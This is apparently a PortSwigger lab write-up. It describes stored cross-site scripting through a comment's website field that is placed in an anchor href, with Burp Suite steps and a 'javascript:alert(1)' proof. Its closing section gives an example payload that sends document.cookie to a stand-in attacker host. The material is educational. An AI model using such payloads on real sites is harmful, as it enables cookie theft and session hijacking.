# 

## Lab Loc:
> https://portswigger.net/web-security/cross-site-scripting/contexts/lab-href-attribute-double-quotes-html-encoded

## About Lab Summary
In this attack, I exploited a stored cross-site scripting vulnerability by injecting 
a JavaScript payload into the `website` field of a comment. The website placed that input directly inside an anchor tag like:
```html
<a href="...">Name</a
```
So i injected:
```js
javascript:alert(1)
```
This turned the whole link into a `JavaScript trigger`. When a user clicks the name, the payload executes.

## Procedure
- Went to the blog post and submit a comment:
- Name: Cybernerdddd
- Email: cy@x.com
- Website: any string, I used(abc123)
- Comment: stored xss test

Used Burp Suite to intercept the request
Sent it to Repeater and replaced the website with
```js
javascript: alert(1)
```
- Click Send in Repeater
- Reload the post page and click on the name -> alert box triggered!!!

## Why it worked
The app inserts your website into:
```
<a href="USER_INPUT">Name</a>
```
so if the input is javascript.... , clicking the name will run js

## Why this is dangerorus
> This could be used to:
> Steal cookies
> Hijack sessions
> Load fake login pages
**Example**
`website=javascript:fetch('https://attacker.site?c='+document.cookie)`
